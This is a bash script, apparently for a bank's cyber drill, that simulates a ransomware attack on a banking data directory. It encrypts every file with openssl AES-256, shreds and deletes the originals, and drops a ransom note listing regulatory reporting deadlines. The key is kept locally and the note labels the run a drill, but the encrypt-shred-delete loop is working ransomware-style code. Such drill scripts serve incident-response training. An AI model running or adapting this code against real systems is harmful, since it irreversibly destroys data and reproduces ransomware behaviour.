#!/bin/bash
# ================================================================
#  Union Bank of India – Cyber Drill Scenario #5
#  RANSOMWARE SIMULATION – AES-256-CBC Encryption
#  Simulates encryption of banking data directories
#  Banking Impact: RBI 6-hour incident reporting obligation triggered
#
#  Usage: ./ransom_sim.sh
#  Decryption: ./decrypt_sim.sh
#  Key file:   /tmp/.drill_key (generated during encryption)
# ================================================================

TARGET_DIR="/var/lib/ubibank/data"
KEY_FILE="/tmp/.drill_key"
NOTE_FILE="${TARGET_DIR}/RANSOM_NOTE.txt"
LOG_FILE="/tmp/ransom_drill.log"
PASSPHRASE="UBIDrillEncKey2024@CyberDrill#${RANDOM}"

RED='\033[0;31m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'
GREEN='\033[0;32m'; BOLD='\033[1m'; RESET='\033[0m'
BLINK='\033[5m'

log() { echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"; }

print_banner() {
echo -e "${RED}${BOLD}"
cat << 'RANSOM_BANNER'
██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝
RANSOM_BANNER
echo -e "${RESET}"
echo -e "${YELLOW}╔══════════════════════════════════════════════════════════════╗${RESET}"
echo -e "${YELLOW}║           UNION BANK OF INDIA – CRITICAL ALERT               ║${RESET}"
echo -e "${YELLOW}║         ALL BANKING DATA HAS BEEN ENCRYPTED                  ║${RESET}"
echo -e "${YELLOW}╚══════════════════════════════════════════════════════════════╝${RESET}"
}

# ── Check root ─────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[ERROR] Run as root: sudo ./ransom_sim.sh${RESET}"
    exit 1
fi

# ── Check target dir ───────────────────────────────
if [[ ! -d "$TARGET_DIR" ]]; then
    echo -e "${RED}[ERROR] Target directory $TARGET_DIR not found. Run 01_configure.sh first.${RESET}"
    exit 1
fi

print_banner
echo ""
log "=== UBI Cyber Drill – Ransomware Scenario START ==="
log "Target directory: $TARGET_DIR"
log "Passphrase stored in: $KEY_FILE"

# ── Encrypt all files ──────────────────────────────
echo -e "\n${CYAN}[*] Initiating encryption of banking data...${RESET}"
sleep 1

ENCRYPTED_COUNT=0
FAILED_COUNT=0

# Store the key
echo "$PASSPHRASE" > "$KEY_FILE"
chmod 600 "$KEY_FILE"

# Walk target directory
while IFS= read -r -d '' FILE; do
    BASENAME=$(basename "$FILE")
    # Skip ransom note itself and already-encrypted files
    if [[ "$BASENAME" == "RANSOM_NOTE.txt" || "$FILE" == *.enc ]]; then
        continue
    fi

    ENC_FILE="${FILE}.enc"
    if openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 \
        -in "$FILE" -out "$ENC_FILE" -pass "pass:$PASSPHRASE" 2>/dev/null; then
        # Overwrite original with zeros then remove (simulate irreversible destruction)
        shred -z -n 1 "$FILE" 2>/dev/null || dd if=/dev/zero of="$FILE" bs=1024 count=$(( $(wc -c < "$FILE") / 1024 + 1 )) 2>/dev/null
        rm -f "$FILE"
        log "  ENCRYPTED: $BASENAME → ${BASENAME}.enc"
        ((ENCRYPTED_COUNT++))
        echo -ne "\r${RED}  [ENCRYPTING] Files processed: $ENCRYPTED_COUNT${RESET}"
        sleep 0.3
    else
        log "  FAILED: $BASENAME"
        ((FAILED_COUNT++))
    fi
done < <(find "$TARGET_DIR" -type f -not -name "RANSOM_NOTE.txt" -print0)

echo ""
echo ""

# ── Drop ransom note ───────────────────────────────
cat > "$NOTE_FILE" << RANSOM_NOTE
╔══════════════════════════════════════════════════════════════════╗
║        UNION BANK OF INDIA – RANSOMWARE INCIDENT NOTICE          ║
╚══════════════════════════════════════════════════════════════════╝

Your banking data has been ENCRYPTED using AES-256-CBC encryption.

Encrypted data includes:
  - Customer PII (Name, Aadhaar, PAN, Address, DOB)
  - Account balances and transaction history
  - NEFT/RTGS batch settlement files
  - Core Banking System (CBS) configuration
  - SWIFT interface credentials

ENCRYPTED FILES: $ENCRYPTED_COUNT
ENCRYPTION KEY : Held by attacker – NOT recoverable without key

REGULATORY IMPACT:
  ▸ RBI Cybersecurity Framework: Incident must be reported to RBI within 6 HOURS
  ▸ DPDP Act 2023, Section 8(6): Personal data breach notification mandatory
  ▸ CERT-In: Ransomware incident reporting within 6 hours of detection
  ▸ Bandhan Bank/NPCI UPI services: Immediate suspension of affected operations

RECOVERY:
  Run: ./decrypt_sim.sh        [DRILL ONLY – for exercise recovery]
  Key: Stored in /tmp/.drill_key for drill purposes

──────────────────────────────────────────────────────────────────
NOTE: THIS IS A CYBER DRILL SIMULATION – NO REAL DATA WAS HARMED
      All files can be restored using ./decrypt_sim.sh
      Passphrase: $PASSPHRASE
──────────────────────────────────────────────────────────────────
RANSOM_NOTE

# ── Simulate dropped indicators ────────────────────
echo "$PASSPHRASE" > "/tmp/.drill_key"

# ── Display impact ─────────────────────────────────
echo -e "${RED}${BOLD}"
echo "  ██████████████████████████████████████████████████"
echo "  ██                                              ██"
echo "  ██   ENCRYPTION COMPLETE – DRILL SCENARIO #5   ██"
echo "  ██                                              ██"
echo "  ██████████████████████████████████████████████████"
echo -e "${RESET}"

echo -e "${YELLOW}"
echo "  ════════════════════════════════════════════════════"
echo "  RANSOMWARE DRILL EXECUTION SUMMARY"
echo "  ════════════════════════════════════════════════════"
echo "  Target Directory : $TARGET_DIR"
echo "  Files Encrypted  : $ENCRYPTED_COUNT"
echo "  Files Failed     : $FAILED_COUNT"
echo "  Encryption Key   : $KEY_FILE"
echo "  Ransom Note      : $NOTE_FILE"
echo "  ════════════════════════════════════════════════════"
echo ""
echo "  BANKING IMPACT TRIGGERED:"
echo "  ✗ Customer data directory: INACCESSIBLE"
echo "  ✗ NEFT/RTGS batch files:   ENCRYPTED"
echo "  ✗ CBS config credentials:  ENCRYPTED"
echo "  ✗ RBI 6-hour reporting:    CLOCK STARTED → $(date -d '+6 hours' '+%H:%M %Z')"
echo "  ✗ CERT-In notification:    REQUIRED"
echo "  ✗ DPDP Act Section 8(6):   BREACH NOTIFICATION TRIGGERED"
echo "  ════════════════════════════════════════════════════"
echo -e "${RESET}"

echo -e "\n${GREEN}[DRILL] To decrypt and restore: sudo ./decrypt_sim.sh${RESET}"
echo -e "${CYAN}[LOG]   Full log: $LOG_FILE${RESET}\n"

log "=== Ransomware Scenario COMPLETE: $ENCRYPTED_COUNT files encrypted ==="
